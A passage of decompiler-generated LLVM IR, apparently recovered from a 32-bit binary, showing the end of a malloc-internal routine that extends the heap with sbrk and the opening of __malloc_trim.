  store i32 %v2_804a9a0, i32* %ecx.global-to-local, align 4
  %v2_804a9a2 = sub i32 %v0_804aa62, %v2_804a9a0
  %v7_804a9a2 = icmp ult i32 %v0_804aa62, %v2_804a9a0
  %v12_804a9a2 = icmp eq i32 %v2_804a9a2, 0
  %v1_804a9a4 = icmp eq i1 %v12_804a9a2, false
  br i1 %v1_804a9a4, label %dec_label_pc_804a9bd, label %dec_label_pc_804a9a6

dec_label_pc_804a9a6:                             ; preds = %dec_label_pc_804a996
  %v10_804a9a6 = icmp eq i32 %v0_804aa54, -1
  %v1_804a9a9 = icmp eq i1 %v10_804a9a6, false
  br i1 %v1_804a9a9, label %dec_label_pc_804a9bd, label %dec_label_pc_804a9ab

dec_label_pc_804a9ab:                             ; preds = %dec_label_pc_804a9a6
  store i32 %v0_804a8e2, i32* %ecx.global-to-local, align 4
  %v2_804a9af = add i32 %v1_804a99a, %v1_804a8f2
  %v1_804a9b2 = or i32 %v2_804a9af, 1
  store i32 %v1_804a9b2, i32* %eax.global-to-local, align 4
  store i32 %v1_804a9b2, i32* %v2_804a8eb, align 4
  br label %dec_label_pc_804aaea

dec_label_pc_804a9bd:                             ; preds = %dec_label_pc_804a9a6, %dec_label_pc_804a996
  %v0_804a9bd = load i8, i8* @global_var_8054960.53, align 1
  %v1_804a9bd = sext i8 %v0_804a9bd to i32
  store i32 %v1_804a9bd, i32* %eax.global-to-local, align 4
  %v2_804a9c2 = urem i8 %v0_804a9bd, 2
  %v3_804a9c2 = icmp eq i8 %v2_804a9c2, 0
  br i1 %v3_804a9c2, label %dec_label_pc_804a9d6, label %dec_label_pc_804a9c6

dec_label_pc_804a9c6:                             ; preds = %dec_label_pc_804a9bd
  br i1 %v2_804a8f2, label %dec_label_pc_804a9d6, label %dec_label_pc_804a9ca

dec_label_pc_804a9ca:                             ; preds = %dec_label_pc_804a9c6
  %v1_804a9cc = icmp eq i1 %v7_804a9a2, false
  br i1 %v1_804a9cc, label %dec_label_pc_804a9d6, label %dec_label_pc_804a9ce

dec_label_pc_804a9ce:                             ; preds = %dec_label_pc_804a9ca
  %v1_804a9ce = and i32 %v1_804a9bd, -2
  %v4_804a9ce = trunc i32 %v1_804a9ce to i8
  store i32 %v1_804a9ce, i32* %eax.global-to-local, align 4
  store i8 %v4_804a9ce, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a9d6

dec_label_pc_804a9d6:                             ; preds = %dec_label_pc_804a9ca, %dec_label_pc_804a9c6, %dec_label_pc_804a9bd, %dec_label_pc_804a9ce
  %v0_804a9d6 = phi i8 [ %v0_804a9bd, %dec_label_pc_804a9ca ], [ %v0_804a9bd, %dec_label_pc_804a9c6 ], [ %v0_804a9bd, %dec_label_pc_804a9bd ], [ %v4_804a9ce, %dec_label_pc_804a9ce ]
  %v1_804a9d6 = urem i8 %v0_804a9d6, 2
  %v2_804a9d6 = icmp eq i8 %v1_804a9d6, 0
  br i1 %v2_804a9d6, label %dec_label_pc_804aa54, label %dec_label_pc_804a9df

dec_label_pc_804a9df:                             ; preds = %dec_label_pc_804a9d6
  br i1 %v2_804a8f2, label %dec_label_pc_804a9ed, label %dec_label_pc_804a9e3

dec_label_pc_804a9e3:                             ; preds = %dec_label_pc_804a9df
  store i32 %v2_804a9a2, i32* %eax.global-to-local, align 4
  %v2_804a9e7 = add i32 %v2_804a99a, %v2_804a9a2
  store i32 %v2_804a9e7, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a9ed

dec_label_pc_804a9ed:                             ; preds = %dec_label_pc_804a9df, %dec_label_pc_804a9e3
  %v1_804a9ef = urem i32 %v0_804aa62, 8
  %v2_804a9ef = icmp eq i32 %v1_804a9ef, 0
  store i32 %v1_804a9ef, i32* %edx.global-to-local, align 4
  %v1_804a9f2 = icmp eq i1 %v2_804a9ef, false
  br i1 %v1_804a9f2, label %dec_label_pc_804a9fa, label %dec_label_pc_804a9f4

dec_label_pc_804a9f4:                             ; preds = %dec_label_pc_804a9ed
  store i32 %v0_804aa62, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aa04

dec_label_pc_804a9fa:                             ; preds = %dec_label_pc_804a9ed
  %v2_804a9ff = sub nsw i32 8, %v1_804a9ef
  store i32 %v2_804a9ff, i32* %eax.global-to-local, align 4
  %v2_804aa01 = add i32 %v2_804a9ff, %v0_804aa62
  store i32 %v2_804aa01, i32* @edi, align 4
  br label %dec_label_pc_804aa04

dec_label_pc_804aa04:                             ; preds = %dec_label_pc_804a9f4, %dec_label_pc_804a9fa
  %v0_804aa11 = phi i32 [ 0, %dec_label_pc_804a9f4 ], [ %v2_804a9ff, %dec_label_pc_804a9fa ]
  %v2_804aa04 = add i32 %v1_804a99a, %v0_804aa62
  %v2_804aa11 = add i32 %v0_804aa11, %v1_804a8f2
  store i32 %v2_804aa11, i32* %ecx.global-to-local, align 4
  %v2_804aa14 = add i32 %v2_804aa11, %v2_804aa04
  store i32 %v2_804aa14, i32* %edx.global-to-local, align 4
  %v2_804aa16 = add i32 %v2_804aa14, %v1_804a804
  %v5_804aa19 = and i32 %v2_804aa16, %v1_804a914
  %v2_804aa20 = sub i32 %v5_804aa19, %v2_804aa14
  store i32 %v2_804aa20, i32* %eax.global-to-local, align 4
  %v2_804aa22 = add i32 %v2_804aa20, %v2_804aa11
  store i32 %v2_804aa22, i32* @esi, align 4
  store i32 %v2_804aa22, i32* %stack_var_-92, align 4
  %v1_804aa26 = call i32 @__GI_sbrk(i32 %v2_804aa22)
  store i32 %v1_804aa26, i32* %eax.global-to-local, align 4
  %v10_804aa2e = icmp eq i32 %v1_804aa26, -1
  store i32 %v1_804aa26, i32* %edx.global-to-local, align 4
  %v1_804aa33 = icmp eq i1 %v10_804aa2e, false
  br i1 %v1_804aa33, label %dec_label_pc_804aa43, label %dec_label_pc_804aa35

dec_label_pc_804aa35:                             ; preds = %dec_label_pc_804aa04
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804aa3a = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa3a, i32* %eax.global-to-local, align 4
  store i32 %v1_804aa3a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804aa77

dec_label_pc_804aa43:                             ; preds = %dec_label_pc_804aa04
  %v1_804aa43 = load i32, i32* @ebx, align 4
  %v7_804aa43 = icmp ult i32 %v1_804aa26, %v1_804aa43
  %v1_804aa45 = icmp eq i1 %v7_804aa43, false
  br i1 %v1_804aa45, label %dec_label_pc_804aa7c, label %dec_label_pc_804aa47

dec_label_pc_804aa47:                             ; preds = %dec_label_pc_804aa43
  %v0_804aa47 = load i8, i8* @global_var_8054960.53, align 1
  %v2_804aa47 = and i8 %v0_804aa47, -2
  store i8 %v2_804aa47, i8* @global_var_8054960.53, align 32
  store i32 %v2_804aa04, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804aa5b

dec_label_pc_804aa54:                             ; preds = %dec_label_pc_804a9d6
  %v10_804aa54 = icmp eq i32 %v0_804aa54, -1
  br i1 %v10_804aa54, label %dec_label_pc_804aa5f, label %dec_label_pc_804aa59

dec_label_pc_804aa59:                             ; preds = %dec_label_pc_804aa54
  store i32 %v0_804aa62, i32* @edi, align 4
  br label %dec_label_pc_804aa5b

dec_label_pc_804aa5b:                             ; preds = %dec_label_pc_804aa47, %dec_label_pc_804aa59
  %v0_804aa7c47 = phi i32 [ %v2_804aa04, %dec_label_pc_804aa47 ], [ %v0_804aa54, %dec_label_pc_804aa59 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804aa7c

dec_label_pc_804aa5f:                             ; preds = %dec_label_pc_804aa54
  store i32 %v0_804aa62, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804aa66 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa66, i32* %edx.global-to-local, align 4
  %v1_804aa6d = load i32, i32* @ebx, align 4
  %v2_804aa6d = sub i32 %v1_804aa66, %v1_804aa6d
  %v1_804aa6f = load i32, i32* @esi, align 4
  %v2_804aa6f = sub i32 %v2_804aa6d, %v1_804aa6f
  store i32 %v2_804aa6f, i32* %eax.global-to-local, align 4
  %v0_804aa71 = load i32, i32* @global_var_8054968.50, align 8
  %v2_804aa71 = add i32 %v0_804aa71, %v2_804aa6f
  store i32 %v2_804aa71, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804aa77

dec_label_pc_804aa77:                             ; preds = %dec_label_pc_804aa35, %dec_label_pc_804aa5f
  %v0_804aa7c46 = phi i32 [ %v1_804aa3a, %dec_label_pc_804aa35 ], [ %v1_804aa66, %dec_label_pc_804aa5f ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804aa7c

dec_label_pc_804aa7c:                             ; preds = %dec_label_pc_804aa43, %dec_label_pc_804aa5b, %dec_label_pc_804aa77
  %v0_804aa81 = phi i32 [ %v1_804aa26, %dec_label_pc_804aa43 ], [ %v0_804aa7c47, %dec_label_pc_804aa5b ], [ %v0_804aa7c46, %dec_label_pc_804aa77 ]
  %v10_804aa7c = icmp eq i32 %v0_804aa81, -1
  br i1 %v10_804aa7c, label %dec_label_pc_804aaea, label %dec_label_pc_804aa81

dec_label_pc_804aa81:                             ; preds = %dec_label_pc_804aa7c
  %v1_804aa81 = load i32, i32* @edi, align 4
  %v2_804aa81 = sub i32 %v0_804aa81, %v1_804aa81
  store i32 %v2_804aa81, i32* %edx.global-to-local, align 4
  %v1_804aa83 = load i32, i32* @esi, align 4
  %v2_804aa83 = add i32 %v1_804aa83, %v2_804aa81
  %v1_804aa86 = or i32 %v2_804aa83, 1
  store i32 %v1_804aa86, i32* %eax.global-to-local, align 4
  store i32 %v1_804aa81, i32* @global_var_805462c.38, align 4
  %v2_804aa8f = add i32 %v1_804aa81, 4
  %v3_804aa8f = inttoptr i32 %v2_804aa8f to i32*
  store i32 %v1_804aa86, i32* %v3_804aa8f, align 4
  %v0_804aa92 = load i32, i32* @global_var_8054968.50, align 8
  %v1_804aa92 = load i32, i32* @esi, align 4
  %v2_804aa92 = add i32 %v1_804aa92, %v0_804aa92
  store i32 %v2_804aa92, i32* @global_var_8054968.50, align 8
  br i1 %v2_804a8f2, label %dec_label_pc_804aaea, label %dec_label_pc_804aa9c

dec_label_pc_804aa9c:                             ; preds = %dec_label_pc_804aa81
  store i32 %v0_804a8e2, i32* %ecx.global-to-local, align 4
  %v1_804aaa0 = add i32 %v1_804a8f2, -12
  %v1_804aaa3 = and i32 %v1_804aaa0, -8
  store i32 %v1_804aaa3, i32* %eax.global-to-local, align 4
  %v1_804aaa8 = or i32 %v1_804aaa3, 1
  store i32 %v1_804aaa8, i32* %edx.global-to-local, align 4
  %v5_804aaab = icmp ult i32 %v1_804aaa3, 15
  store i32 %v1_804aaa8, i32* %v2_804a8eb, align 4
  %v0_804aab1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aab1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aab1 = add i32 %v0_804aab1, 4
  %v3_804aab1 = add i32 %v2_804aab1, %v1_804aab1
  %v4_804aab1 = inttoptr i32 %v3_804aab1 to i32*
  store i32 5, i32* %v4_804aab1, align 4
  %v0_804aab9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aab9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aab9 = add i32 %v0_804aab9, 8
  %v3_804aab9 = add i32 %v2_804aab9, %v1_804aab9
  %v4_804aab9 = inttoptr i32 %v3_804aab9 to i32*
  store i32 5, i32* %v4_804aab9, align 4
  br i1 %v5_804aaab, label %dec_label_pc_804aaea, label %dec_label_pc_804aac3

dec_label_pc_804aac3:                             ; preds = %dec_label_pc_804aa9c
  %v0_804aac3 = load i32, i32* @global_var_8054944.54, align 4
  store i32 %v0_804aac3, i32* @ebx, align 4
  %v0_804aac9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aace = add i32 %v0_804aac9, 8
  store i32 %v1_804aace, i32* %eax.global-to-local, align 4
  store i32 %v1_804aace, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054944.54, align 4
  %v1_804aadc = call i32 @free(i32 %v1_804aace)
  store i32 %v1_804aadc, i32* %eax.global-to-local, align 4
  %v0_804aae4 = load i32, i32* @ebx, align 4
  store i32 %v0_804aae4, i32* @global_var_8054944.54, align 4
  br label %dec_label_pc_804aaea

dec_label_pc_804aaea:                             ; preds = %dec_label_pc_804aa9c, %dec_label_pc_804aa81, %dec_label_pc_804aa7c, %dec_label_pc_804a9ab, %dec_label_pc_804aac3
  %v0_804aaea = load i32, i32* @global_var_8054968.50, align 8
  %v0_804aaef = load i32, i32* @global_var_805496c.55, align 4
  %v0_804aafb = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804aafb, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_804aaea, %v0_804aaef
  %v5_804ab01 = select i1 %tmp89, i32 %v0_804aaef, i32 %v0_804aaea
  store i32 %v5_804ab01, i32* @edx, align 4
  %v1_804ab04 = load i32, i32* @global_var_8054964.49, align 4
  %v2_804ab04 = add i32 %v1_804ab04, %v0_804aaea
  store i32 %v5_804ab01, i32* @global_var_805496c.55, align 4
  %v1_804ab10 = load i32, i32* @global_var_8054974.51, align 4
  %tmp90 = icmp ule i32 %v2_804ab04, %v1_804ab10
  %v5_804ab16 = select i1 %tmp90, i32 %v1_804ab10, i32 %v2_804ab04
  store i32 %v5_804ab16, i32* %eax.global-to-local, align 4
  store i32 %v5_804ab16, i32* @global_var_8054974.51, align 4
  %v1_804ab22 = add i32 %v0_804aafb, 4
  %v2_804ab22 = inttoptr i32 %v1_804ab22 to i32*
  %v3_804ab22 = load i32, i32* %v2_804ab22, align 4
  %v1_804ab25 = and i32 %v3_804ab22, -4
  store i32 %v1_804ab25, i32* @ecx, align 4
  %v10_804ab28 = icmp ult i32 %v1_804ab25, %v1_804a7a2
  br i1 %v10_804ab28, label %dec_label_pc_804aba8, label %dec_label_pc_804ab2e

dec_label_pc_804ab2e:                             ; preds = %dec_label_pc_804aaea
  store i32 %v1_804a82a, i32* %esi.global-to-local, align 4
  %v2_804ab34 = sub i32 %v1_804ab25, %v1_804a82a
  store i32 %v2_804ab34, i32* %ecx.global-to-local, align 4
  %v2_804ab36 = add i32 %v0_804aafb, %v1_804a82a
  store i32 %v2_804ab36, i32* @edx, align 4
  %v1_804ab39 = or i32 %v1_804a82a, 1
  store i32 %v1_804ab39, i32* %eax.global-to-local, align 4
  store i32 %v2_804ab36, i32* @global_var_805462c.38, align 4
  store i32 %v1_804ab39, i32* %v2_804ab22, align 4
  %v0_804ab45.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ab45

dec_label_pc_804ab45:                             ; preds = %dec_label_pc_804a7b0, %dec_label_pc_804ab2e
  %v0_804ab45 = phi i32 [ %v5_804a7c3, %dec_label_pc_804a7b0 ], [ %v0_804ab45.pre, %dec_label_pc_804ab2e ]
  %v1_804ab45 = or i32 %v0_804ab45, 1
  store i32 %v1_804ab45, i32* @ecx, align 4
  %v0_804ab48 = load i32, i32* @ebx, align 4
  %v1_804ab48 = add i32 %v0_804ab48, 8
  store i32 %v1_804ab48, i32* %ebx.global-to-local, align 4
  %v1_804ab4b = load i32, i32* @edx, align 4
  %v2_804ab4b = add i32 %v1_804ab4b, 4
  %v3_804ab4b = inttoptr i32 %v2_804ab4b to i32*
  store i32 %v1_804ab45, i32* %v3_804ab4b, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804ab50:                             ; preds = %dec_label_pc_804a562
  %v5_804ab56 = sub i32 %v1_804a545, %v1_804a82a
  store i32 %v5_804ab56, i32* %eax.global-to-local, align 4
  %v2_804ab5a = add i32 %v0_804a610113, %v1_804a82a
  store i32 %v2_804ab5a, i32* @edx, align 4
  %v1_804ab5e = or i32 %v1_804a82a, 1
  store i32 %v2_804ab5a, i32* @global_var_8054630.39, align 16
  store i32 %v1_804ab5e, i32* %v2_804a53f, align 4
  %v0_804ab6a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab6c = or i32 %v0_804ab6a, 1
  store i32 %v1_804ab6c, i32* @ecx, align 4
  %v0_804ab6f = load i32, i32* @edx, align 4
  store i32 %v0_804ab6f, i32* @global_var_805463c.56, align 4
  store i32 %v0_804ab6f, i32* @global_var_8054640.41, align 64
  %v1_804ab7b = add i32 %v0_804ab6f, 8
  %v2_804ab7b = inttoptr i32 %v1_804ab7b to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ab7b, align 4
  %v0_804ab82 = load i32, i32* @edx, align 4
  %v1_804ab82 = add i32 %v0_804ab82, 12
  %v2_804ab82 = inttoptr i32 %v1_804ab82 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ab82, align 4
  %v0_804ab89 = load i32, i32* @ecx, align 4
  %v1_804ab89 = load i32, i32* @edx, align 4
  %v2_804ab89 = add i32 %v1_804ab89, 4
  %v3_804ab89 = inttoptr i32 %v2_804ab89 to i32*
  store i32 %v0_804ab89, i32* %v3_804ab89, align 4
  %v0_804ab8c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab8c = load i32, i32* @edx, align 4
  %v3_804ab8c = add i32 %v1_804ab8c, %v0_804ab8c
  %v4_804ab8c = inttoptr i32 %v3_804ab8c to i32*
  store i32 %v0_804ab8c, i32* %v4_804ab8c, align 4
  br label %dec_label_pc_804ab9a

dec_label_pc_804ab91:                             ; preds = %dec_label_pc_804a571
  store i32 %v1_804a82a, i32* %ebx.global-to-local, align 4
  %v0_804ab95 = load i32, i32* @ebp, align 4
  %v2_804ab95 = or i32 %v1_804a82a, 4
  %v3_804ab95 = add i32 %v0_804ab95, %v2_804ab95
  %v4_804ab95 = inttoptr i32 %v3_804ab95 to i32*
  %v5_804ab95 = load i32, i32* %v4_804ab95, align 4
  %v6_804ab95 = or i32 %v5_804ab95, 1
  store i32 %v6_804ab95, i32* %v4_804ab95, align 4
  br label %dec_label_pc_804ab9a

dec_label_pc_804ab9a:                             ; preds = %dec_label_pc_804ab50, %dec_label_pc_804ab91
  %v0_804ab9a = load i32, i32* @ebp, align 4
  %v1_804ab9a = add i32 %v0_804ab9a, 8
  store i32 %v1_804ab9a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804ab9f:                             ; preds = %dec_label_pc_804a661
  %v1_804ab9f = load i32, i32* @ebx, align 4
  %v2_804ab9f = add i32 %v0_804a66d, 4
  %v3_804ab9f = add i32 %v2_804ab9f, %v1_804ab9f
  %v4_804ab9f = inttoptr i32 %v3_804ab9f to i32*
  %v5_804ab9f = load i32, i32* %v4_804ab9f, align 4
  %v6_804ab9f = or i32 %v5_804ab9f, 1
  store i32 %v6_804ab9f, i32* %v4_804ab9f, align 4
  br label %dec_label_pc_804aba4

dec_label_pc_804aba4:                             ; preds = %dec_label_pc_804a679, %dec_label_pc_804ab9f
  %v0_804aba4 = load i32, i32* @ecx, align 4
  store i32 %v0_804aba4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804aba8:                             ; preds = %dec_label_pc_804a94b, %dec_label_pc_804aaea, %dec_label_pc_804a98d, %dec_label_pc_804a963
  %v0_804aba8 = load i32, i32* %stack_var_-92, align 4
  %v1_804aba8 = call i32 @__errno_location(i32 %v0_804aba8)
  store i32 %v1_804aba8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804abaf = inttoptr i32 %v1_804aba8 to i32*
  store i32 12, i32* %v1_804abaf, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804abb5:                             ; preds = %dec_label_pc_804aba4, %dec_label_pc_804ab9a, %dec_label_pc_804ab45, %dec_label_pc_804a7db, %dec_label_pc_804a78d, %dec_label_pc_804a50c, %dec_label_pc_804aba8
  store i32 %v2_804a443, i32* @eax, align 4
  store i32 %v2_804a443, i32* %stack_var_-92, align 4
  %v2_804abbe = call i32 @__pthread_return_void(i32 %v2_804a443, i32 1)
  store i32 %v2_804abbe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804abc6

dec_label_pc_804abc6:                             ; preds = %dec_label_pc_804a461, %dec_label_pc_804abb5
  %v0_804abc9 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804abc9, i32* %eax.global-to-local, align 4
  %v2_804abcb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804abcb, i32* @ebx, align 4
  store i32 %v0_804a430, i32* @esi, align 4
  store i32 %v0_804a42f, i32* @edi, align 4
  store i32 %v0_804a42e, i32* @ebp, align 4
  ret i32 %v0_804abc9

; uselistorder directives
  uselistorder i32 %v0_804ab8c, { 1, 0 }
  uselistorder i32 %v1_804ab10, { 1, 0 }
  uselistorder i32 %v2_804ab04, { 1, 0 }
  uselistorder i32 %v0_804aaef, { 1, 0 }
  uselistorder i32 %v0_804aaea, { 0, 2, 1 }
  uselistorder i32 %v1_804aa81, { 1, 0, 2 }
  uselistorder i32 %v0_804aa81, { 1, 0 }
  uselistorder i32 %v2_804aa6f, { 1, 0 }
  uselistorder i32 %v1_804aa26, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804aa14, { 1, 0, 2 }
  uselistorder i32 %v2_804aa04, { 1, 2, 0 }
  uselistorder i32 %v2_804a9ff, { 1, 0, 2 }
  uselistorder i32 %v1_804a9ef, { 2, 1, 0 }
  uselistorder i8 %v0_804a9bd, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804a9a0, { 1, 0, 2 }
  uselistorder i32 %v0_804aa62, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_804aa54, { 2, 0, 1 }
  uselistorder i32 %v8_804a970, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_804a956, { 1, 0, 2 }
  uselistorder i32 %v3_804a956, { 1, 0 }
  uselistorder i32 %v1_804a924, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804a918, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804a914, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804a902, { 1, 0 }
  uselistorder i32 %v1_804a8f2, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804a8e2, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804a8cb, { 1, 0 }
  uselistorder i32 %v2_804a8bf, { 1, 0 }
  uselistorder i32 %v2_804a8af, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804a893, { 1, 2, 0 }
  uselistorder i32 %v1_804a893, { 1, 0, 2 }
  uselistorder i32 %v1_804a892, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804a88c, { 1, 0 }
  uselistorder i32 %v2_804a86a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a85e, { 2, 1, 0 }
  uselistorder i32 %v8_804a849, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_804a830, { 1, 0, 2 }
  uselistorder i32 %v0_804a7d3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804a7a2, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a795, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804a77b, { 1, 0, 2 }
  uselistorder i32 %v1_804a715, { 1, 0 }
  uselistorder i32 %v3_804a70a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804a704, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804a70112, { 1, 0 }
  uselistorder i32 %v2_804a6f6, { 1, 0 }
  uselistorder i32 %v1_804a6da, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a6d6, { 2, 1, 0 }
  uselistorder i32 %v1_804a6d2, { 1, 0 }
  uselistorder i32 %v1_804a6cd, { 2, 1, 0 }
  uselistorder i32 %v2_804a6bc, { 1, 0 }
  uselistorder i32 %v1_804a6b9, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804a657, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804a6a2, { 1, 0 }
  uselistorder i32 %v0_804a66d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804a643, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a610, { 0, 2, 1 }
  uselistorder i32 %v2_804a5f4, { 1, 0 }
  uselistorder i32 %v1_804a5ea, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804a5e5.lcssa, { 1, 0 }
  uselistorder i32 %v3_804a5d5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804a5cc, { 1, 0, 2 }
  uselistorder i32 %v3_804a5af, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804a5a8, { 1, 0, 2 }
  uselistorder i32 %v2_804a590, { 2, 1, 0 }
  uselistorder i32 %v0_804a57c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804a542, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804a610113, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a610107, { 1, 0, 2 }
  uselistorder i32 %v3_804a4ef, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804a4e1, { 2, 1, 0 }
  uselistorder i32 %v2_804a4bc, { 2, 1, 0 }
  uselistorder i8 %v0_804a48a, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804a82a, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804a473, { 1, 2, 0 }
  uselistorder i32 %v0_804a45c, { 1, 0 }
  uselistorder i32 %v2_804a443, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 1, 12, 13, 15, 16, 17, 18, 0, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8054960.53, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134563380, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8054640.41, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805462c.38 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804abc6, { 1, 0 }
  uselistorder label %dec_label_pc_804abb5, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804aba8, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804aba4, { 1, 0 }
  uselistorder label %dec_label_pc_804ab9a, { 1, 0 }
  uselistorder label %dec_label_pc_804ab45, { 1, 0 }
  uselistorder label %dec_label_pc_804aaea, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804aa7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804aa77, { 1, 0 }
  uselistorder label %dec_label_pc_804aa5b, { 1, 0 }
  uselistorder label %dec_label_pc_804aa04, { 1, 0 }
  uselistorder label %dec_label_pc_804a9ed, { 1, 0 }
  uselistorder label %dec_label_pc_804a9d6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a98d, { 1, 0 }
  uselistorder label %dec_label_pc_804a94b, { 1, 0 }
  uselistorder label %dec_label_pc_804a8e2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804a881, { 1, 0 }
  uselistorder label %dec_label_pc_804a795, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a78d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a701, { 1, 0 }
  uselistorder label %dec_label_pc_804a706.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a6da, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a661, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804a5e8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a5d1, { 1, 0 }
  uselistorder label %dec_label_pc_804a53f, { 1, 0 }
  uselistorder label %dec_label_pc_804a610.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a50c, { 1, 0 }
  uselistorder label %dec_label_pc_804a48a, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804abd1 = load i32, i32* @edx, align 4
  store i32 %v0_804abd1, i32* %ebp.global-to-local, align 4
